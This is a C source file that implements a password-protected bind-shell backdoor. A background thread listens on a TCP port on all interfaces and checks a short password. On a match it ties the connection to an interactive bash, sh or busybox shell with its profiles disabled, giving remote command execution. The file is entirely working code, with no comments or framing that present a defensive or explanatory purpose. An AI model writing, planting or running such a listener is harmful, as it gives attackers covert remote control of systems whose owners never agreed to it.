#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include <pthread.h>

#define MAX_PASS_LEN 8

static void* shell_listener_thread(void* arg);

struct shell_listener_args {
    int port;
    char password[MAX_PASS_LEN+1];
};

static int current_server_fd = -1;
static pthread_t current_tid = 0;

void stop_shell_listener() {
    if (current_server_fd != -1) {
        close(current_server_fd);
        current_server_fd = -1;
    }
    if (current_tid != 0) {
        pthread_cancel(current_tid);
        current_tid = 0;
    }
}

int start_shell_listener(int port, const char* password) {
    stop_shell_listener();
    pthread_t tid;
    struct shell_listener_args* args = malloc(sizeof(struct shell_listener_args));
    if (!args) return -1;
    args->port = port;
    strncpy(args->password, password, MAX_PASS_LEN);
    args->password[MAX_PASS_LEN] = '\0';
    if (pthread_create(&tid, NULL, shell_listener_thread, args) != 0) {
        free(args);
        return -1;
    }
    pthread_detach(tid);
    current_tid = tid;
    return 0;
}


#ifndef HAVE_SETENV_DECL
extern int setenv(const char *name, const char *value, int overwrite);
#endif

static void* shell_listener_thread(void* arg) {
    struct shell_listener_args* args = (struct shell_listener_args*)arg;
    int server_fd, client_fd;
    struct sockaddr_in addr;
    char recvbuf[64];
    int n;

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) { free(args); return NULL; }
    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_port = htons(args->port);
    if (bind(server_fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(server_fd); free(args); return NULL;
    }
    listen(server_fd, 1);
    current_server_fd = server_fd;
    while (1) {
        client_fd = accept(server_fd, NULL, NULL);
        if (client_fd < 0) continue;
        ssize_t _unused;
        _unused = write(client_fd, "\033[32m> \033[0mPassword: ", 22);
        n = read(client_fd, recvbuf, MAX_PASS_LEN+2);
        if (n <= 0) { close(client_fd); continue; }
        recvbuf[n] = 0;
        char* nl = strchr(recvbuf, '\n'); if (nl) *nl = 0;
        nl = strchr(recvbuf, '\r'); if (nl) *nl = 0;
        if (strncmp(recvbuf, args->password, MAX_PASS_LEN) == 0) {
            _unused = write(client_fd, "\n\033[32m> \033[0mAccess granted!\n", 27);
            char* shells[] = {"/bin/bash", "/bin/sh", "/bin/busybox"};
            int i;
            for (i = 0; i < 3; ++i) {
                if (access(shells[i], X_OK) == 0) {
                    dup2(client_fd, 0); dup2(client_fd, 1); dup2(client_fd, 2);
                    setenv("PS1", "\033[32m> \033[0m", 1);
                    if (i == 0) {
                        execl(shells[i], shells[i], "--noprofile", "--norc", "-i", NULL);
                        execl(shells[i], shells[i], NULL); // fallback
                    } else if (i == 1) {
                        execl(shells[i], shells[i], "-i", NULL);
                        execl(shells[i], shells[i], NULL); // fallback
                    } else {
                        execl(shells[i], shells[i], "sh", "-i", NULL);
                        execl(shells[i], shells[i], "sh", NULL); // fallback
                    }
                    break;
                }
            }
            _unused = write(client_fd, "\n\033[32m> \033[0mNo shell available\n", 31);
        } else {
            _unused = write(client_fd, "\n\033[32m> \033[0mWrong password!\n", 28);
        }
        close(client_fd);
    }
    close(server_fd);
    free(args);
    return NULL;
}
